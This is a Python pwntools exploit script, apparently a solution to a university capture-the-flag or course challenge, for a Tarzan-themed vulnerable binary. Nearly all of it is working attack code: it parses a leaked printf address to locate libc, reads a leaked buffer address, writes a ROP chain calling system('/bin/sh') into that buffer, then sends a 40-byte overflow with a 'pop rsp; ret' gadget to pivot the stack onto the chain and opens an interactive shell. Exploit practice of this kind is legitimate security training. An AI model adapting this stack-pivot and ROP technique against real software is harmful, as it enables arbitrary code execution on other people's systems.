#!/usr/bin/env python3

import pwn

# this is required on gnome to start gdb
pwn.context.terminal = ['gnome-terminal', '--']

# pwninit
exe = pwn.ELF("./vuln_patched")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'
#pwn.context.binary = exe

port = 1024
#conn = pwn.remote('tasks.ws24.softsec.rub.de', port)
conn = pwn.process([exe.path])

pwn.gdb.attach(conn, gdbscript="""
set detach-on-fork off
set follow-fork-mode child
""")

pwn.pause()

# 1) leak libc offset
conn.recvuntil(b'[Jane] Here, Tarzan, this is called P R I N T F: ')
pointer = conn.recvline()
print(pointer)
libc_pointer = int(pointer[2:-1], 16)
print(hex(libc_pointer))
libc_base = libc_pointer - libc.symbols['printf']
print(f'libc at: {hex(libc_base)}')
libc.address = libc_base

# 2) leak buffer
conn.recvuntil(b'[Tarzan] ??? : ')
buffer = conn.recvline()
print(buffer)
buffer_pointer = int(buffer[2:-1], 16)
print(f'buffer at: {hex(buffer_pointer)}')

# 3) build ropchain
rop = pwn.ROP(libc)
#rop.call(rop.ret) # this is needed for aligned sothat syscall is 16 byte aligned
# call system, so jump to this address and set parameter beforehand
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])

payload = rop.chain()
conn.sendlineafter(b'Prepare your vine swing location:\n', payload)

# 4) swing to ropchain
# find gadget via ropper: ropper --file ./libc.so.6 --search "pop rsp"

gadget = libc.address + 0x000000000002746a#: pop rsp; ret; 

rop_chain = b"A" * 40 + pwn.p64(gadget) + pwn.p64(buffer_pointer)
conn.sendlineafter(b'Now swing to it:\n', rop_chain)


conn.interactive()
